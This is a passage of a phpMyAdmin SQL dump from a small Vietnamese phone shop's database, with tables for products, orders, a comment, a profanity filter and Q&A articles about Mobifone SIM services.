-- phpMyAdmin SQL Dump
-- version 5.0.4
-- https://www.phpmyadmin.net/
--
-- Máy chủ: 127.0.0.1
-- Thời gian đã tạo: Th9 23, 2021 lúc 02:33 PM
-- Phiên bản máy phục vụ: 10.4.17-MariaDB
-- Phiên bản PHP: 8.0.0

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Cơ sở dữ liệu: `mobileshop`
--

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `banned_word`
--

CREATE TABLE `banned_word` (
  `ban_word` varchar(225) COLLATE utf8_unicode_ci NOT NULL,
  `ban_id` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Đang đổ dữ liệu cho bảng `banned_word`
--

INSERT INTO `banned_word` (`ban_word`, `ban_id`) VALUES
('DCM', 2),
('vcl', 3),
('dcmm', 4),
('dm', 5);

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `category`
--

CREATE TABLE `category` (
  `cat_id` int(11) NOT NULL,
  `cat_name` varchar(255) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Đang đổ dữ liệu cho bảng `category`
--

INSERT INTO `category` (`cat_id`, `cat_name`) VALUES
(6, 'Blackberry'),
(3, 'HTC'),
(1, 'iPhone'),
(4, 'Nokia'),
(7, 'OPPO'),
(2, 'Samsung'),
(5, 'Sony'),
(9, 'Vivo'),
(8, 'Xiaomi');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `comment`
--

CREATE TABLE `comment` (
  `comm_id` int(11) NOT NULL,
  `prd_id` int(11) NOT NULL,
  `comm_name` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `comm_mail` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `comm_date` datetime NOT NULL,
  `comm_details` text COLLATE utf8_unicode_ci NOT NULL,
  `comm_permission` int(11) NOT NULL DEFAULT 0,
  `rep_comm_id` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Đang đổ dữ liệu cho bảng `comment`
--

INSERT INTO `comment` (`comm_id`, `prd_id`, `comm_name`, `comm_mail`, `comm_date`, `comm_details`, `comm_permission`, `rep_comm_id`) VALUES
(49, 1, 'nguyen van lam', 'lamnguyen@kontum.gov.vn', '2020-10-21 10:26:03', 'google morning!', 0, NULL);

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `prd_order`
--

CREATE TABLE `prd_order` (
  `ord_id` int(11) NOT NULL,
  `prd_id` int(11) DEFAULT NULL,
  `amount` int(11) NOT NULL,
  `tot_id` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Đang đổ dữ liệu cho bảng `prd_order`
--

INSERT INTO `prd_order` (`ord_id`, `prd_id`, `amount`, `tot_id`) VALUES
(3, 2, 1, 4),
(4, 2, 2, 5),
(5, 6, 1, 5),
(6, 16, 1, 6),
(7, 16, 1, 7),
(8, 16, 1, 8),
(9, 28, 1, 8),
(10, 16, 1, 9),
(11, 28, 1, 9),
(12, 2, 1, 10),
(13, 16, 1, 10),
(14, 28, 1, 10),
(15, 1, 1, 11),
(16, 1, 1, 12),
(17, 1, 1, 13),
(18, 1, 1, 14),
(19, 1, 1, 15),
(20, 1, 1, 16),
(21, 1, 1, 17),
(22, 1, 1, 18),
(23, 1, 2, 19),
(24, 1, 1, 20),
(25, 1, 1, 21),
(26, 1, 1, 22),
(27, 1, 1, 23),
(28, 1, 2, 24),
(29, 1, 2, 25),
(30, 1, 3, 26),
(31, 1, 3, 27),
(32, 1, 3, 28),
(33, 1, 4, 29),
(34, 1, 4, 30),
(35, 1, 4, 31),
(36, 1, 4, 32),
(37, 1, 4, 33),
(38, 1, 1, 35),
(39, 11, 1, 36),
(40, 6, 1, 36),
(41, 6, 1, 36),
(42, 1, 1, 37),
(43, 11, 2, 38),
(44, 1, 1, 39),
(45, 1, 1, 39),
(46, 1, 1, 40),
(47, 7, 1, 41),
(48, 1, 1, 42),
(49, 11, 1, 43),
(50, 7, 1, 44),
(51, 16, 1, 44),
(52, 1, 1, 45),
(53, 2, 1, 46),
(54, 2, 1, 47),
(55, 2, 1, 48),
(56, 2, 1, 49),
(57, 2, 1, 50),
(58, 2, 1, 51),
(59, 2, 1, 52),
(60, 2, 1, 53),
(61, 2, 1, 54),
(62, 2, 1, 55),
(63, 2, 1, 56);

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `product`
--

CREATE TABLE `product` (
  `prd_id` int(11) NOT NULL,
  `cat_id` int(11) NOT NULL,
  `prd_name` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `prd_image` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `prd_price` int(10) UNSIGNED NOT NULL,
  `prd_warranty` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `prd_accessories` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `prd_new` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `prd_promotion` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `prd_status` int(11) NOT NULL,
  `prd_featured` int(11) NOT NULL,
  `prd_details` text COLLATE utf8_unicode_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Đang đổ dữ liệu cho bảng `product`
--

INSERT INTO `product` (`prd_id`, `cat_id`, `prd_name`, `prd_image`, `prd_price`, `prd_warranty`, `prd_accessories`, `prd_new`, `prd_promotion`, `prd_status`, `prd_featured`, `prd_details`) VALUES
(1, 1, 'iPhone 7 Plus 32GB Rose Gold', 'iPhone-7-Plus-32GB-Rose-Gold.png', 3599999, '12 Tháng', 'Hộp, sách, sạc, cáp, tai nghe', 'Máy Mới 100%', 'Dán Màn Hình 4D', 1, 1, 'Sản phẩm này chúng tôi đang cập nhật nội dung chi tiết, các bạn có thể qua trực tiếp cửa hàng để xem sản phẩm, vì hàng chúng tôi luôn có sẵn.'),
(2, 1, 'iPhone X 256GB Silver Seedstock', 'iPhone-X-256GB-Silver-Seedstock.png', 27490000, '12 Tháng', 'Hộp, sách, sạc, cáp, tai nghe', 'Máy Mới 100%', 'Dán Màn Hình 4D', 1, 1, 'Sản phẩm này chúng tôi đang cập nhật nội dung chi tiết, các bạn có thể qua trực tiếp cửa hàng để xem sản phẩm, vì hàng chúng tôi luôn có sẵn.'),
(3, 1, 'iPhone Xr 2 Sim 64GB Yellow', 'iPhone-Xr-2-Sim-64GB-Yellow.png', 12990000, '12 Tháng', 'Hộp, sách, sạc, cáp, tai nghe', 'Máy Mới 100%', 'Dán Màn Hình 4D', 1, 0, 'Sản phẩm này chúng tôi đang cập nhật nội dung chi tiết, các bạn có thể qua trực tiếp cửa hàng để xem sản phẩm, vì hàng chúng tôi luôn có sẵn.'),
(4, 1, 'iPhone Xr 2 Sim 56GB Red', 'iPhone-Xr-2-Sim-256GB-Red.png', 16690000, '12 Tháng', 'Hộp, sách, sạc, cáp, tai nghe', 'Máy Mới 100%', 'Dán Màn Hình 4D', 1, 0, 'Sản phẩm này chúng tôi đang cập nhật nội dung chi tiết, các bạn có thể qua trực tiếp cửa hàng để xem sản phẩm, vì hàng chúng tôi luôn có sẵn.'),
(5, 1, 'iPhone Xs 256GB Gold', 'iPhone-Xs-256GB-Gold.png', 24490000, '12 Tháng', 'Hộp, sách, sạc, cáp, tai nghe', 'Máy Mới 100%', 'Dán Màn Hình 4D', 0, 0, 'Sản phẩm này chúng tôi đang cập nhật nội dung chi tiết, các bạn có thể qua trực tiếp cửa hàng để xem sản phẩm, vì hàng chúng tôi luôn có sẵn.'),
(6, 2, 'Samsung Galaxy A9 2018 Black', 'Samsung-Galaxy-A9-2018-Black.png', 5990000, '12 Tháng', 'Hộp, sách, sạc, cáp, tai nghe', 'Máy Mới 100%', 'Dán Màn Hình 4D', 1, 1, 'Sản phẩm này chúng tôi đang cập nhật nội dung chi tiết, các bạn có thể qua trực tiếp cửa hàng để xem sản phẩm, vì hàng chúng tôi luôn có sẵn.'),
(7, 2, 'Samsung Galaxy J2 Core Gold', 'Samsung-Galaxy-J2-Core-Gold.png', 2390000, '12 Tháng', 'Hộp, sách, sạc, cáp, tai nghe', 'Máy Mới 100%', 'Dán Màn Hình 4D', 1, 1, 'Sản phẩm này chúng tôi đang cập nhật nội dung chi tiết, các bạn có thể qua trực tiếp cửa hàng để xem sản phẩm, vì hàng chúng tôi luôn có sẵn.'),
(8, 2, 'Samsung Galaxy J4 Core Black', 'Samsung-Galaxy-J4-Core-Black.png', 2850000, '12 Tháng', 'Hộp, sách, sạc, cáp, tai nghe', 'Máy Mới 100%', 'Dán Màn Hình 4D', 1, 0, 'Sản phẩm này chúng tôi đang cập nhật nội dung chi tiết, các bạn có thể qua trực tiếp cửa hàng để xem sản phẩm, vì hàng chúng tôi luôn có sẵn.'),
(9, 2, 'Samsung Galaxy S9 Plus 64GB Orchid Gray', 'Samsung-Galaxy-S9-Plus-64GB-Orchid-Gray.png', 12990000, '12 Tháng', 'Hộp, sách, sạc, cáp, tai nghe', 'Máy Mới 100%', 'Dán Màn Hình 4D', 1, 0, 'Sản phẩm này chúng tôi đang cập nhật nội dung chi tiết, các bạn có thể qua trực tiếp cửa hàng để xem sản phẩm, vì hàng chúng tôi luôn có sẵn.'),
(10, 2, 'Samsung Galaxy S9 Plus Black 128GB', 'Samsung-Galaxy-S9-Plus-Black-128GB.png', 14590000, '12 Tháng', 'Hộp, sách, sạc, cáp, tai nghe', 'Máy Mới 100%', 'Dán Màn Hình 4D', 0, 0, 'Sản phẩm này chúng tôi đang cập nhật nội dung chi tiết, các bạn có thể qua trực tiếp cửa hàng để xem sản phẩm, vì hàng chúng tôi luôn có sẵn.'),
(11, 4, 'Nokia 1 red', 'Nokia-1-red.png', 1590000, '12 Tháng', 'Hộp, sách, sạc, cáp, tai nghe', 'Máy Mới 100%', 'Dán Màn Hình 4D', 1, 1, 'Sản phẩm này chúng tôi đang cập nhật nội dung chi tiết, các bạn có thể qua trực tiếp cửa hàng để xem sản phẩm, vì hàng chúng tôi luôn có sẵn.'),
(12, 4, 'Nokia 3.1 Black', 'Nokia-3.1-Black.png', 3190000, '12 Tháng', 'Hộp, sách, sạc, cáp, tai nghe', 'Máy Mới 100%', 'Dán Màn Hình 4D', 1, 0, 'Sản phẩm này chúng tôi đang cập nhật nội dung chi tiết, các bạn có thể qua trực tiếp cửa hàng để xem sản phẩm, vì hàng chúng tôi luôn có sẵn.'),
(13, 4, 'Nokia 6.1 Plus Blue', 'Nokia-6.1-Plus-Blue.png', 4790000, '12 Tháng', 'Hộp, sách, sạc, cáp, tai nghe', 'Máy Mới 100%', 'Dán Màn Hình 4D', 1, 0, 'Sản phẩm này chúng tôi đang cập nhật nội dung chi tiết, các bạn có thể qua trực tiếp cửa hàng để xem sản phẩm, vì hàng chúng tôi luôn có sẵn.'),
(14, 4, 'Nokia 6.1 Plus White', 'Nokia-6.1-Plus-White.png', 5290000, '12 Tháng', 'Hộp, sách, sạc, cáp, tai nghe', 'Máy Mới 100%', 'Dán Màn Hình 4D', 1, 0, 'Sản phẩm này chúng tôi đang cập nhật nội dung chi tiết, các bạn có thể qua trực tiếp cửa hàng để xem sản phẩm, vì hàng chúng tôi luôn có sẵn.'),
(15, 4, 'Nokia 150 White', 'Nokia-150-White.png', 1290000, '12 Tháng', 'Hộp, sách, sạc, cáp, tai nghe', 'Máy Mới 100%', 'Dán Màn Hình 4D', 0, 0, 'Sản phẩm này chúng tôi đang cập nhật nội dung chi tiết, các bạn có thể qua trực tiếp cửa hàng để xem sản phẩm, vì hàng chúng tôi luôn có sẵn.'),
(16, 7, 'OPPO A3s 16GB Red', 'OPPO-A3s–16GB-Red.png', 2690000, '12 Tháng', 'Hộp, sách, sạc, cáp, tai nghe', 'Máy Mới 100%', 'Dán Màn Hình 4D', 1, 1, 'Sản phẩm này chúng tôi đang cập nhật nội dung chi tiết, các bạn có thể qua trực tiếp cửa hàng để xem sản phẩm, vì hàng chúng tôi luôn có sẵn.'),
(17, 7, 'OPPO A7 64GB Blue', 'OPPO-A7-64GB-Blue.png', 3290000, '12 Tháng', 'Hộp, sách, sạc, cáp, tai nghe', 'Máy Mới 100%', 'Dán Màn Hình 4D', 1, 0, 'Sản phẩm này chúng tôi đang cập nhật nội dung chi tiết, các bạn có thể qua trực tiếp cửa hàng để xem sản phẩm, vì hàng chúng tôi luôn có sẵn.'),
(18, 7, 'OPPO F7 128GB Black', 'OPPO-F7-128GB-Black.png', 3990000, '12 Tháng', 'Hộp, sách, sạc, cáp, tai nghe', 'Máy Mới 100%', 'Dán Màn Hình 4D', 1, 0, 'Sản phẩm này chúng tôi đang cập nhật nội dung chi tiết, các bạn có thể qua trực tiếp cửa hàng để xem sản phẩm, vì hàng chúng tôi luôn có sẵn.'),
(19, 7, 'OPPO F9 Sunrise Red', 'OPPO-F9-Sunrise-Red.png', 5090000, '12 Tháng', 'Hộp, sách, sạc, cáp, tai nghe', 'Máy Mới 100%', 'Dán Màn Hình 4D', 1, 0, 'Sản phẩm này chúng tôi đang cập nhật nội dung chi tiết, các bạn có thể qua trực tiếp cửa hàng để xem sản phẩm, vì hàng chúng tôi luôn có sẵn.'),
(20, 7, 'OPPO R17 Pro Lavender', 'OPPO-R17-Pro-Lavender.png', 8790000, '12 Tháng', 'Hộp, sách, sạc, cáp, tai nghe', 'Máy Mới 100%', 'Dán Màn Hình 4D', 0, 0, 'Sản phẩm này chúng tôi đang cập nhật nội dung chi tiết, các bạn có thể qua trực tiếp cửa hàng để xem sản phẩm, vì hàng chúng tôi luôn có sẵn.'),
(21, 8, 'Xiaomi Mi 8 Pro Black', 'Xiaomi-Mi-8-Pro-Black.png', 11990000, '12 Tháng', 'Hộp, sách, sạc, cáp, tai nghe', 'Máy Mới 100%', 'Dán Màn Hình 4D', 1, 1, 'Sản phẩm này chúng tôi đang cập nhật nội dung chi tiết, các bạn có thể qua trực tiếp cửa hàng để xem sản phẩm, vì hàng chúng tôi luôn có sẵn.'),
(22, 8, 'Xiaomi Mi A1 Black', 'Xiaomi-Mi-A1-Black.png', 12490000, '12 Tháng', 'Hộp, sách, sạc, cáp, tai nghe', 'Máy Mới 100%', 'Dán Màn Hình 4D', 1, 0, 'Sản phẩm này chúng tôi đang cập nhật nội dung chi tiết, các bạn có thể qua trực tiếp cửa hàng để xem sản phẩm, vì hàng chúng tôi luôn có sẵn.'),
(23, 8, 'Xiaomi Mi A1 Gold', 'Xiaomi-Mi-A1-Gold.png', 13490000, '12 Tháng', 'Hộp, sách, sạc, cáp, tai nghe', 'Máy Mới 100%', 'Dán Màn Hình 4D', 1, 0, 'Sản phẩm này chúng tôi đang cập nhật nội dung chi tiết, các bạn có thể qua trực tiếp cửa hàng để xem sản phẩm, vì hàng chúng tôi luôn có sẵn.'),
(24, 8, 'Xiaomi Mi Max 3 Ram 4 64GB-Black', 'Xiaomi-Mi-Max-3-Ram-4–64GB-Black.png', 15990000, '12 Tháng', 'Hộp, sách, sạc, cáp, tai nghe', 'Máy Mới 100%', 'Dán Màn Hình 4D', 1, 0, 'Sản phẩm này chúng tôi đang cập nhật nội dung chi tiết, các bạn có thể qua trực tiếp cửa hàng để xem sản phẩm, vì hàng chúng tôi luôn có sẵn.'),
(25, 8, 'Xiaomi Redmi Note 6 Pro 32GB Blue', 'Xiaomi-Redmi-Note-6-Pro–32GB-Blue.png', 17990000, '12 Tháng', 'Hộp, sách, sạc, cáp, tai nghe', 'Máy Mới 100%', 'Dán Màn Hình 4D', 0, 0, 'Sản phẩm này chúng tôi đang cập nhật nội dung chi tiết, các bạn có thể qua trực tiếp cửa hàng để xem sản phẩm, vì hàng chúng tôi luôn có sẵn.'),
(26, 9, 'Vivo V7 Gold', 'Vivo-V7-Gold.png', 10090000, '12 Tháng', 'Hộp, sách, sạc, cáp, tai nghe', 'Máy Mới 100%', 'Dán Màn Hình 4D', 1, 1, 'Sản phẩm này chúng tôi đang cập nhật nội dung chi tiết, các bạn có thể qua trực tiếp cửa hàng để xem sản phẩm, vì hàng chúng tôi luôn có sẵn.'),
(27, 9, 'Vivo V9 Gold', 'Vivo-V9-Gold.png', 12390000, '12 Tháng', 'Hộp, sách, sạc, cáp, tai nghe', 'Máy Mới 100%', 'Dán Màn Hình 4D', 1, 0, 'Sản phẩm này chúng tôi đang cập nhật nội dung chi tiết, các bạn có thể qua trực tiếp cửa hàng để xem sản phẩm, vì hàng chúng tôi luôn có sẵn.'),
(28, 9, 'Vivo Y53C Gold', 'Vivo-Y53C-Gold.png', 13590000, '12 Tháng', 'Hộp, sách, sạc, cáp, tai nghe', 'Máy Mới 100%', 'Dán Màn Hình 4D', 1, 0, 'Sản phẩm này chúng tôi đang cập nhật nội dung chi tiết, các bạn có thể qua trực tiếp cửa hàng để xem sản phẩm, vì hàng chúng tôi luôn có sẵn.'),
(29, 9, 'Vivo Y69 Gold', 'Vivo-Y69-Gold.png', 15790000, '12 Tháng', 'Hộp, sách, sạc, cáp, tai nghe', 'Máy Mới 100%', 'Dán Màn Hình 4D', 1, 0, 'Sản phẩm này chúng tôi đang cập nhật nội dung chi tiết, các bạn có thể qua trực tiếp cửa hàng để xem sản phẩm, vì hàng chúng tôi luôn có sẵn.'),
(30, 9, 'Vivo Y81i Red', 'Vivo-Y81i-Red.png', 18790000, '12 Tháng', 'Hộp, sách, sạc, cáp, tai nghe', 'Máy Mới 100%', 'Dán Màn Hình 4D', 0, 0, 'Sản phẩm này chúng tôi đang cập nhật nội dung chi tiết, các bạn có thể qua trực tiếp cửa hàng để xem sản phẩm, vì hàng chúng tôi luôn có sẵn.');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `qa`
--

CREATE TABLE `qa` (
  `id` int(6) UNSIGNED NOT NULL,
  `qa_title` varchar(3000) COLLATE utf8_unicode_ci NOT NULL,
  `qa_detail` mediumtext COLLATE utf8_unicode_ci NOT NULL,
  `qa_img` varchar(3000) COLLATE utf8_unicode_ci NOT NULL,
  `qa_img_detail` varchar(5000) COLLATE utf8_unicode_ci DEFAULT NULL,
  `tit_img` varchar(500) COLLATE utf8_unicode_ci DEFAULT NULL,
  `tit_detail` varchar(500) COLLATE utf8_unicode_ci DEFAULT NULL,
  `date` date DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Đang đổ dữ liệu cho bảng `qa`
--

INSERT INTO `qa` (`id`, `qa_title`, `qa_detail`, `qa_img`, `qa_img_detail`, `tit_img`, `tit_detail`, `date`) VALUES
(1, 'Cách đăng ký Multisim Mobifone 1 số điện thoại dùng được 4 sim', '<p>Bắt đầu từ ngày 12/1/2021 Mutisim Mobifone đã chính thức được ra mắt để đáp ứng sự mong mỏi của khách hàng sau nhiều ngày mong chờ. Đăng ký Multisim Mobifone giúp quý khách hàng có thể sử dụng 1 số điện thoại tách ra thành 4 sim để sử dụng trên nhiều thiết bị. Như vậy việc quản lý các dịch vụ trên sim Mobifone sẽ trở nên đơn giản và dễ dàng hơn rất nhiều. Đặc biệt là với những thuê bao Mobifone sử dụng nhiều thiết bị máy tính bảng, đồng hồ thông minh thay vì trước đây phải sử dụng nhiều sim đăng ký nhiều gói cước dịch vụ, giờ đây bạn đã có thể tiết kiệm cước phí hơn khi có Multisim.</p><p>\r\nMultisim Mobifone cho phép khách hàng sử dụng 1 sim chính và kèm thêm 3 sim phụ sử dụng chung 1 số điện thoại để gắn lên nhiều thiết bị. Dịch vụ Multisim được ra mắt sẽ thõa lòng mong đợi của rất nhiều thuê bao, bởi hiện nay số lượng khách hàng dùng nhiều thiết bị thông minh khá cao. Và Multisim ra mắt sẽ là giải pháp giúp quý khách hàng tiết kiệm cước phí nhiều hơn.</p>\r\n<h3>Multisim Mobifone là gì?</h3>\r\n<p>Multisim là một dịch vụ mới ra mắt của Mobifone cho phép khách hàng sử dụng 1 số điện thoại duy nhất tách ra thành tối đa 4 sim để sử dụng cho nhiều thiết bị.</p><p>\r\nTrong Multisim sẽ có 1 sim chính (sử dụng cho mọi tính năng thông thường của sim) và 3 sim phụ (có chức năng gọi, truy cập mạng nhưng không thể thực hiện nhắn tin, nhận cuộc gọi đến và thao tác mã USSD).</p><p>\r\nVới sự phân chia chức năng rõ ràng, người dùng Multisim của Mobifone thường sử dụng sim chính trên điện thoại và 3 sim phụ ở các thiết bị khác (máy tính bảng, đồng hồ thông minh…).</p>\r\n<h3>Lợi ích khi đăng ký Multisim của Mobifone</h3><p>\r\nSử dụng dịch vu Multisim Mobifone quý khách hàng sẽ có rất nhiều lợi ích, đặc biệt là với những khách hàng sử dụng nhiều thiết bị di động cùng lúc:</p>\r\n<ul><li style=\"text-align: justify;\"> Không cần đăng ký nhiều số thuê bao cho các thiết bị khác nhau, chỉ cần sử dụng Multisim Mobi bạn có thể sử dụng 1 sim chính, 3 sim phụ cho tổng cộng 4 thiết bị trên cùng 1 số điện thoại.</li><li style=\"text-align: justify;\"> Kiểm soát và sử dụng hiệu quả tài khoản, lưu lượng data và rất nhiều các ưu đãi nhà mạng dành riêng cho từng thuê bao Mobifone.</li><li style=\"text-align: justify;\"> Các sim phụ có thể thực hiện nhiều chức năng tương tự như sim chính như gọi thoại, data độc lập hoàn toàn với sim chính.</li></ul><h3 > Hướng dẫn cách đăng ký Multisim&nbsp;Mobifone<br></h3><p style=\"text-align: justify;\"> <strong>– Thủ tục đăng ký:</strong></p><ul><li style=\"text-align: justify;\"> Giấy CMND hoặc thẻ CCCD đăng ký chính chủ sim cần đăng ký Multisim.</li><li style=\"text-align: justify;\"> Sim Mobifone muốn thực hiện đăng ký Multisim.</li></ul><p style=\"text-align: justify;\"> <strong>– Địa điểm đăng ký sim:</strong> Tại các cửa hàng, trung tâm giao dịch của Mobifone trên toàn quốc. Quý khách hàng có thể liên hệ đến <a href=\"https://mobifone.net.vn/tong-dai-mobifone-so-hotline-cham-soc-khach-hang-24-7.html\"><strong>tổng đài Mobi</strong></a>fone để được cung cấp địa chỉ cửa hàng Mobifone gần nhất.</p><p style=\"text-align: justify;\"> <strong>– Đối tượng áp dụng:</strong> Tất cả thuê bao Mobifone có nhu cầu sử dụng Multisim của Mobi</p><p style=\"text-align: justify;\"> <strong>– Cước phí đăng ký dịch vụ Mutisim của Mobifone:</strong></p><p style=\"text-align: justify;\"> Đăng ký dịch vụ quý khách hàng phải chi trả các khoản phí đăng ký như sau:</p><ul><li style=\"text-align: justify;\"> 75.000đ để đăng ký sử dụng Multisim Mobi.</li><li style=\"text-align: justify;\"> 25.000đ/sim tiền để sở hữu 1 sim phụ&nbsp;(Nếu sử dụng eSIM Mobifone thì không tính cước phí này). Quý khách hàng được đăng ký tối đa 3 sim phu trên 1 số điện thoại.</li></ul><ul><li style=\"text-align: justify;\"> 75.000đ để đăng ký sử dụng Multisim Mobi.</li><li style=\"text-align: justify;\"> 25.000đ/sim tiền để sở hữu 1 sim phụ&nbsp;(Nếu sử dụng eSIM Mobifone thì không tính cước phí này). Quý khách hàng được đăng ký tối đa 3 sim phu trên 1 số điện thoại.</li></ul><p style=\"text-align: justify;\"> Sử dụng dịch vụ Multisim khách hàng phải đóng phí duy trì hàng tháng cho dịch vụ 25.000đ /31 ngày/sim. Cước phí tối đa để sử dụng 3 Mutisim của&nbsp;Mobifone là 75.000đ/31 ngày/ 3 sim.</p>', '2-2.png', 'Đăng ký Multisim Mobifone 1 sim chính, 3 sim phụ dùng chung 1 số điện thoại', '2.png', 'Bắt đầu từ ngày 12/1/2021 Mutisim Mobifone đã chính thức được ra mắt để đáp ứng sự mong mỏi của khách […]', '2021-03-17'),
(2, 'Cách Đăng Ký 3G Mobifone 1 ngày, 1 tháng, Miễn Phí SMS mới nhất 2021', '<p>Đăng ký 3G Mobi giúp cho việc kết nối mạng Internet bằng 3G trên thiết bị di động dễ dàng hơn ngay cả khi ở nơi không có sóng wifi. Làm cách nào để đăng ký 3G Mobifone theo tháng, năm mới nhất 2021 tiết kiệm nhất để kết nối Internet trên điện thoại, laptop, tablet của mình tất cả đều có trong bài viết này của Mobifone.net.vn</p><p style=\"text-align: justify;\"> Để đăng ký 3G MobiPhone bạn chỉ cần soạn tin nhắn với cú pháp đơn giản <span style=\"color:#FF0000;\"><strong>MO [tên-gói] gởi 9084</strong></span> để đăng ký 3G Mobi thành công và sử dụng dịch vụ Mobile Internet Mobifone rồi nhé, hãy nhanh chóng chọn cho mình gói cước phù hợp và tiến hành đăng ký ngay cho thuê bao của mình đi nào.</p><p style=\"text-align: justify;\"> <strong>Đăng ký 3G&nbsp;Mobifone</strong> sẽ giúp bạn tiết kiệm thật nhiều cước phí truy cập dịch vụ Mobile&nbsp;Internet hàng tháng. Đồng thời phục vụ tốt nhu cầu học tập, giải trí, làm việc online hằng ngày. Giờ đây các thiết bị công nghệ của bạn sẽ trở nên thông minh hơn khi đã <strong>đăng ký 3G của Mobifone</strong>. Hãy cùng <strong>Mobifone.net.vn</strong> trải nghiệm đỉnh cao của công nghệ nhé!</p>', '1-1.png', 'Hướng dẫn cách đăng ký 3G Mobifone mới nhất cho điện thoại, Fast Connect', '1.png', 'Đăng ký 3G Mobi giúp cho việc kết nối mạng Internet bằng 3G trên thiết bị di động dễ dàng hơn ngay cả […]', '2021-01-25'),
(4, 'ESim Mobifone là gì? Chuyển sim thường sang eSim Mobifone miễn phí', '<p>eSim Mobifone là gì? Cách chuyển sim thường sang eSim Mobifone trên các dòng điện thoại iPhone, Samsung là điều mà rất nhiều người dùng di động thắc mắc hiện nay. Khi điện thoại có hỗ trợ eSim Mobifone thì mang lại rất nhiều tiện ích cho người dùng để tránh các tình trạng mất sim không đáng có. </p><p>\r\nĐổi sim thường sang eSim Mobifone sẽ giúp quý khách hàng hạn chế được tình trạng sim hỏng, kẹt khe sim hay điện thoại không nhận được sim…đặc biệt khi đăng ký 3G hay đăng ký gói 4G Mobifone sử dụng ổn định hơn và nếu bạn vẫn chưa sở hữu được chiếc eSim Mobifone thì cùng theo dõi nội dung bài viết dưới đây để tìm hiểu chi tiết các thủ tục chuyển sim thường sang eSim Mobifone nhé.</p><p>\r\n<h2 style=\"text-align: justify;\"> <strong>Hướng dẫn <a href=\"https://mobifone.net.vn/cach-chuyen-sim-thuong-sang-esim-mobifone.html\">cách chuyển sim thường sang eSim Mobifone</a></strong><br></h2><p style=\"text-align: justify;\"> Để chuyển sim thường sáng eSim <a rel=\"nofollow\" href=\"http://mobifone.net.vn\"><strong>Mobifone</strong></a>, khách hàng cần chuẩn bị một số thủ tục và đến đúng nơi thực hiện thì mới có thể chuyển đổi thành công. Cụ thể như sau:</p><p style=\"text-align: justify;\"> <strong>– Các giấy tờ, thủ tục cần chuẩn bị:</strong></p><ul><li style=\"text-align: justify;\"> Giấy chứng minh nhân dân (bản gốc).&nbsp;</li><li style=\"text-align: justify;\"> Sim Mobifone thông thường muốn chuyển đổi eSim.</li></ul><p style=\"text-align: justify;\"> <strong>– Cước phí chuyển đổi:&nbsp;</strong>25.000đ/sim.</p><p style=\"text-align: justify;\"> <strong>– Địa điểm thực hiện:&nbsp;</strong>Các trung tâm giao dịch của Mobifone trên toàn quốc.</p><p style=\"text-align: justify;\"> Tại cửa hàng giao dịch của Mobifone, khách hàng điền thông tin theo hướng dẫn của giao dịch viên. Sau đó nhận một mã QR, khách hàng tiến hành quét mã QR để tải thông tin eSim vào điện thoại. Để đảm bảo có thể thực hiện thành công, hãy thực hiện toàn bộ thao tác tại cửa hàng để đảm bảo không bị trục trặc gây mất nhiều thời gian.</p>', '3-3.png', 'Cách chuyển sim thường sang eSim Mobifone', '3.png', 'eSim Mobifone là gì? Cách chuyển sim thường sang eSim Mobifone trên các dòng điện thoại iPhone, Samsung là điều mà rất […]', '2021-04-12'),
(5, 'Đầu số 089 mạng gì? Ý nghĩa của sim đầu số 089 là gì?', '<p>Đầu số 089 mạng gì tại sao được tìm kiếm nhiều trên mạng như vậy? Khi mà nhà cung cấp dịch vụ viễn thông cho ra mắt các đầu số 08x mới trong đó cả 3 nhà mạng đều có sim đầu số này? Các sim đầu số 08x là đầu 10 số bổ sung sau và đều có ở tất cả các nhà mạng và đầu số 089 là một trong những đầu số đẹp mặc dù ra mắt không lâu nhưng lại rất được người dùng chọn lựa và sử dụng.</p>\r\n<p style=\"text-align: justify;\"> Theo quan niệm đầu số 089 mạng gì là sim đầu số rất may mắn, chính vì thế nên thật không khó để giải thích cho đầu số này lại được ưa chuộng như thế. Vậy ý nghĩa đặc biệt của sim đầu số 089 là gì hãy cùng tìm hiểu nhé.</p><h2 style=\"text-align: justify;\"> <strong>Sim đầu số 089 mạng gì?</strong><br></h2><p style=\"text-align: justify;\"> Đầu số 089 xuất hiện từ giữa năm 2016 và là đầu số 10 số mặc định thuộc nhà mạng <a href=\"https://mobifone.net.vn\"><strong>Mobifone</strong></a>. Sau thời gian dài phát triển các đầu 11 số, thì đầu 089 của Mobifone như một cột mốc đánh dấu sự trở lại của đầu số di động 10 số.</p><p style=\"text-align: justify;\"> Đầu số 089 cho đến hiện tại được xem là \"người em út\" của Mobifone. Trước đó là sự ra mắt của các đàn anh đầu 10 số&nbsp;090, 093 và đầu 11 